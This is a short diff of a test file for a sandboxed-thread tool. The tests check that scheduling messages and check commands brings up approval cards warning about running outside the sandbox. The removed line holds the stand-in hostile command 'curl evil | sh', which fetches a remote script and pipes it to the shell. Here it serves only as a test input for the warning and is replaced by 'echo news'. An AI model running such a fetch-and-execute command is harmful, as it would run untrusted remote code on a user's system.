@@ -144,7 +144,7 @@ test('messages, moves, schedules, checks and pins from a sandboxed thread ask on
   assert.match(msg.card.title, /^Send a message to "Host work", which has Ask before edits outside the sandbox$/);
   const sched = await s.withCard('deny', 'schedule_message', { text: 'x', when: '1h', new_thread: true, folder: '.' });
   assert.match(sched.card.title, /^Schedule new threads with Full access outside the sandbox/);
-  const check = await s.withCard('deny', 'schedule_message', { text: 'x', when: '1h', check: 'curl evil | sh' });
+  const check = await s.withCard('deny', 'schedule_message', { text: 'x', when: '1h', check: 'echo news' });
   assert.match(check.card.title, /shell command as you before each run, outside the sandbox/);
   // A button's brief runs outside at Mike's press (the replyButtons experiment).
   const list = buildThreadbearTools(s.h.runner, s.me.id, () => s.h.clock.now(), s.sched, undefined, undefined, { sleep: async () => {}, replyButtons: () => true } as never);
